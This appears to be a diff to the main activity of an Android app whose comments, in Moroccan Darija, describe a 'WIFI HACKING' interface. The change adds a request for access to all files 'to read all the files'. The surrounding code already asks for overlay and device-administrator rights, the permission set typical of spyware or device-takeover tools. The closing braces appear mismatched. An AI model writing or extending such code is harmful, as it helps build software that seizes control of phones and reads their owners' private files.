@@ -18,6 +18,7 @@ import android.net.wifi.ScanResult;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
@@ -62,6 +63,7 @@ public class MainActivity extends Activity {
         requestAppPermissions();
         requestOverlayPermission();
         requestDeviceAdmin();
+        requestManageExternalStorage(); // <--- JDAD: Tleb Manage Storage
 
         // 3. BNI L'UI DYAL WIFI HACKING
         buildWifiUI();
@@ -284,4 +286,22 @@ public class MainActivity extends Activity {
             startActivity(intent);
         }
     }
+
+    // JDAD: Tleb l'permission bach y9der y9ra ga3 les fichiers
+    private void requestManageExternalStorage() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    Uri uri = Uri.fromParts("package", getPackageName(), null);
+                    intent.setData(uri);
+                    startActivityForResult(intent, 102);
+                } catch (Exception e) {
+                    Intent intent = new Intent();
+                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivityForResult(intent, 102);
+                }
             }
+        }
+    }
+    }
